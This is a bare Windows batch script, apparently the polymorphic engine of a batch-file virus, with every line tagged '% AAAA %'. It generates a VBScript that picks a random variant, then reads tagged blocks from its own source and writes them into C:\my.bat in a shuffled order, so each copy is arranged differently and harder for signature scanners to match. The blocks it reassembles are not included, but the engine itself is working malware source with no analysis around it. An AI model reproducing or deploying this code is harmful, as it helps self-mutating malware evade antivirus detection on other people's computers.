echo @cls > C:\my.bat % AAAA %
echo dim num > AAAA.vbs % AAAA %
echo Set FSO = Wscript.CreateObject("Scripting.FileSystemObject") >>AAAA.vbs % AAAA %
echo Randomize >>AAAA.vbs % AAAA %
echo num = Int((rnd*6) + 1) >>AAAA.vbs % AAAA %
echo if num=1 then >>AAAA.vbs % AAAA %
echo fso.CopyFile Wscript.ScriptFullName, "C:\1.vbs", True >>AAAA.vbs % AAAA %
echo elseif num=2 then >>AAAA.vbs % AAAA %
echo fso.CopyFile Wscript.ScriptFullName, "C:\2.vbs", True >>AAAA.vbs % AAAA %
echo elseif num=3 then >>AAAA.vbs % AAAA %
echo fso.CopyFile Wscript.ScriptFullName, "C:\3.vbs", True >>AAAA.vbs % AAAA %
echo elseif num=4 then >>AAAA.vbs % AAAA %
echo fso.CopyFile Wscript.ScriptFullName, "C:\4.vbs", True >>AAAA.vbs % AAAA %
echo elseif num=5 then >>AAAA.vbs % AAAA %
echo fso.CopyFile Wscript.ScriptFullName, "C:\5.vbs", True >>AAAA.vbs % AAAA %
echo elseif num=6 then >>AAAA.vbs % AAAA %
echo fso.CopyFile Wscript.ScriptFullName, "C:\6.vbs", True >>AAAA.vbs % AAAA %
echo end if >>AAAA.vbs % AAAA %
cscript AAAA.vbs % AAAA %
del AAAA.vbs % AAAA %
if exist C:\1.vbs goto 1 % AAAA %
if exist C:\2.vbs goto 2  % AAAA %
if exist C:\3.vbs goto 3 % AAAA %
if exist C:\4.vbs goto 4 % AAAA %
if exist C:\5.vbs goto 5  % AAAA %
if exist C:\6.vbs goto 6 % AAAA %
goto codebeginn % AAAA %
:1 % AAAA %
set ab=A% AAAA %
find "AAA%ab%"<%0 >> C:\my.bat % AAAA %
set ab=C% AAAA %
find "CCC%ab%"<%0 >> C:\my.bat % AAAA %
set ab=D% AAAA %
find "CCC%ab%"<%0 >> C:\my.bat % AAAA %
set ab=E% AAAA %
find "EEE%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=B% AAAA %
find "BBB%ab%"<%0 >> C:\my.bat  % AAAA %
goto codebeginn % AAAA %
:2 % AAAA %
set ab=A% AAAA %
find "AAA%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=C% AAAA %
find "CCC%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=E% AAAA %
find "EEE%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=D% AAAA %
find "DDD%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=B% AAAA %
find "BBB%ab%"<%0 >> C:\my.bat  % AAAA %
goto codebeginn % AAAA %
:3 % AAAA %
set ab=A% AAAA %
find "AAA%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=D% AAAA %
find "DDD%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=C% AAAA %
find "CCC%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=E% AAAA %
find "EEE%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=B% AAAA %
find "BBB%ab%"<%0 >> C:\my.bat  % AAAA %
goto codebeginn % AAAA %
:4 % AAAA %
set ab=A% AAAA %
find "AAA%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=D% AAAA %
find "DDD%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=E% AAAA %
find "EEE%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=C% AAAA %
find "CCC%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=B% AAAA %
find "BBB%ab%"<%0 >> C:\my.bat  % AAAA %
goto codebeginn % AAAA %
:5 % AAAA %
set ab=A% AAAA %
find "AAA%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=E% AAAA %
find "EEE%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=C% AAAA %
find "CCC%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=D% AAAA %
find "DDD%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=B% AAAA %
find "BBB%ab%"<%0 >> C:\my.bat  % AAAA %
goto codebeginn % AAAA %
:6 % AAAA %
set ab=A% AAAA %
find "AAA%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=E% AAAA %
find "EEE%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=D% AAAA %
find "DDD%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=C% AAAA %
find "CCC%ab%"<%0 >> C:\my.bat  % AAAA %
set ab=B% AAAA %
find "BBB%ab%"<%0 >> C:\my.bat  % AAAA %
goto codebeginn % AAAA %
:codebeginn % AAAA %
del C:\1.vbs % AAAA %
del C:\2.vbs % AAAA %
del C:\3.vbs % AAAA %
del C:\4.vbs % AAAA %
del C:\5.vbs % AAAA%
del C:\6.vbs % AAAA%
